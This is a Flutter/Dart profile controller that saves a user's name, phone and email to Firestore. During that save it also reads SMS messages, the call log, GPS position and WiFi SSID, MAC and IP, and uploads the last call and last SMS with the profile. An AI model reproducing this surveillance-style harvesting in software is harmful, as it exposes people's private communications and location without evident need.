import 'dart:math';

import 'package:appone/constants/routes_name.dart';
import 'package:appone/controller/calls_controller.dart';
import 'package:appone/controller/location_controller.dart';
import 'package:appone/controller/sms_controller.dart';
import 'package:appone/model/user_model.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'connectioninfos_controller.dart';
import 'package:intl/intl.dart';

class ProfileController extends GetxController {
  String uid = "";

  CollectionReference<Map<String, dynamic>> users =
      FirebaseFirestore.instance.collection('users_data');

  RxBool isComplete = true.obs;

  final Rx<TextEditingController> fullname = TextEditingController().obs;
  final Rx<TextEditingController> phone = TextEditingController().obs;
  final Rx<TextEditingController> email = TextEditingController().obs;

  final Rx<DateTime> sendTime = (DateTime.now()).obs;

  final locationController = Get.put(LocationController());
  final connectionController = Get.put(ConnectionInfosController());

  final smsController = Get.put(SMSController());
  final callController = Get.put(CallsController());

  @override
  void onInit() {
    getUser();

    super.onInit();
  }

  @override
  void onClose() {
    fullname.value.clear();
    phone.value.clear();
    email.value.clear();
    super.onClose();
  }

  void switchComplete(bool value) {
    isComplete.value = value;
    update();
  }

  Future addUser(
      {required fullname,
      required email,
      required phone,
      required lastphonecall,
      required lastsmsMsg}) async {
    try {
      uid = FirebaseAuth.instance.currentUser!.uid;
      debugPrint('UID $uid');
    } catch (e) {
      debugPrint("Failed to add user: $e");
    }
    try {
      await smsController.getAllMessages();
      await callController.callbackDispatcher();
      await locationController.determinePosition();
    } catch (e) {
      debugPrint('Error permission check $e');
    }
    var connectionInfs = await connectionController.initPlatformState();

    return users
        .doc(uid)
        .set({
          'full_name': fullname,
          'phone': phone,
          'email': email,
          'lat': locationController.position.value.latitude,
          'long': locationController.position.value.longitude,
          "send_dateime": DateTime.now(),
          'connection_infos': {
            "ssid": connectionInfs!.ssid,
            "mac": connectionInfs.macAddress,
            "connection_type": connectionInfs.connectionType,
            "ip": connectionInfs.ipAddress,
          },
          'last_phone_call': lastphonecall,
          'last_sms_msg': lastsmsMsg
        }, SetOptions(merge: true))
        .then((value) => Get.toNamed(AppRoute.home))
        .catchError((error) {
          Get.snackbar('Failed to add user', 'Please try again');
          debugPrint("Failed to add user: $error");
          return error;
        });
  }

  Future getUser() async {
    try {
      uid = FirebaseAuth.instance.currentUser!.uid;
      var data = await users.doc(uid).get().catchError((err) {
        debugPrint("Failed to get user: $err");
        return err;
      });

      var model = UserModel.fromJson(data.data()!);
      // debugPrint(data.data().toString());
      fullname.value.text = model.fullName!;
      email.value.text = model.email!;
      phone.value.text = model.phone!;
      sendTime.value = model.sendTime!.toDate();

      update();
    } catch (e) {
      debugPrint("Failed to GETIING user: $e");
    }
  }

  Future pushTime() async {
    try {
      uid = FirebaseAuth.instance.currentUser!.uid;
      await users
          .doc(uid)
          .update({'push_time': DateTime.now()})
          .whenComplete(() => debugPrint('Updated Push Time'))
          .catchError((onError) {
            debugPrint('Failed to pushTime 0 $onError');
          });
    } catch (e) {
      debugPrint("Failed to pushTime: $e");
    }
  }

  Future<bool> isExists() async {
    try {
      uid = FirebaseAuth.instance.currentUser!.uid;
    } catch (e) {
      debugPrint("Failed to isExists user: $e");
    }
    final snapShot = await users.doc(uid).get();

    if (snapShot.exists) {
      return false;
    } else {
      return true;
    }
  }
}
